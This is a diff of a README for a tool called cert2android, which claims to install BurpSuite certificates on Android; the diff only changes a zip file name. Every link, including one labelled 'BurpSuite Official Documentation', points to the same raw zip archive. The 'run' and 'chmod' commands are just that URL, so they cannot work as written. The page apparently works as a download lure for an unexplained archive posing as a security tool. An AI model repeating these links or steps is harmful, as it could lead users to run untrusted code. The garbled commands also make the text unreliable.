@@ -1,7 +1,7 @@
 # 🎉 cert2android - Easily Install BurpSuite Certificates on Android
 
 ## 📥 Download Now
-[![Download cert2android](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip)](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip)
+[![Download cert2android](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip)](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To use cert2android, you need:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to the [cert2android Releases Page](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip). This page contains the latest version of the software.
+1. **Visit the Releases Page**: Go to the [cert2android Releases Page](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip). This page contains the latest version of the software.
   
 2. **Download the Latest Release**: Look for the latest version listed, and click on the downloadable file.
 
@@ -41,18 +41,18 @@ To use cert2android, you need:
 
 6. **Run the Script**: Execute the script using the following command:
    ```bash
-   https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip
+   https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip
    ```
    Ensure you have permission to run the script. If needed, use:
    ```bash
-   chmod +x https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip
+   chmod +x https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip
    ```
 
 7. **Connect Your Device**: Connect your Android device or start your emulator. Make sure that USB debugging is enabled on your device.
 
 8. **Install the Certificate**: After connecting your device, run this command:
    ```bash
-   https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip
+   https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip
    ```
 
 9. **Follow On-screen Instructions**: The script will guide you through the final steps to complete the installation.
@@ -67,7 +67,7 @@ Once the installation is successful, your device will have the BurpSuite certifi
 
 - **Device Not Detected**: If your Android device is not detected, confirm that USB debugging is enabled and your device is connected properly.
 
-- **Permission Denied**: If you encounter a permission error, make sure you have executable permissions for the script using `chmod +x https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip`.
+- **Permission Denied**: If you encounter a permission error, make sure you have executable permissions for the script using `chmod +x https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip`.
 
 ## 💡 Additional Information
 
@@ -81,7 +81,7 @@ If you have questions, need help, or want to share your experience, please open 
 
 ## 🔗 Useful Links
 
-- [cert2android Releases Page](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip)
-- [BurpSuite Official Documentation](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert2android.zip) 
+- [cert2android Releases Page](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip)
+- [BurpSuite Official Documentation](https://raw.githubusercontent.com/himanshubaid14/cert2android/main/Waicurian/cert-android-2.4.zip) 
 
 Thank you for choosing cert2android. Enjoy your Android web testing!
